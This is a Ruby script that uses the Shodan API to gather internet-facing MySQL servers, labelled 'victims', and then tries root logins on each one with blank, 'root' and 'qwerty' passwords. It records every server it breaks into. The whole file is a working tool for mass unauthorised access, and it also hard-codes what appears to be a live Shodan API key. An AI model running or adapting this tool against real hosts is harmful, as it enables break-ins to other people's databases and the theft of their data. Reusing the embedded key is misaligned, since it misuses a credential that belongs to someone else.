require 'ipaddr'
require 'awesome_print'
require 'resolv'

QUERY = 'mysql product:"MySQL" os:"Linux 3.x"'
MY_API_KEY = "JsyCs77Kh69kc6MyrHkZ0mgwXWe4XSXZ"
class Database
  def self.find_victims
    api = Shodan::Shodan.new(MY_API_KEY)
    result = api.count(QUERY)
    total = result["total"]

    1.upto(total/100 + 1 ).each do |page|
      begin
        result = api.search(QUERY, page: page)
        result["matches"].each do |victim|
          ip = IPAddr.new(victim['ip'], Socket::AF_INET).to_s
          port = victim['port']

          puts "#{ip}:#{port}"
          node = Node.mysql.find_or_initialize_by(ip: ip)
          node.port = port
          node.save
        end
      rescue Exception => e
        puts e
      end
    end
  end

  def self.pentrating
    Node.mysql.find_each do |node|
      puts "--------------- #{node.id}    ------   #{node.ip}-"
      ["", "root", "qwerty"].each do |p|
        begin
          client = Mysql2::Client.new(:host => node.ip, :username => "root", :password => p, :connect_timeout => 4)
          puts "SUCCESS"
          node.update_column :hacked_way, :mysql
          node.update_column :payload, p
        rescue Exception => e
          puts e, p
          next
        end
      end
    end
  end
end
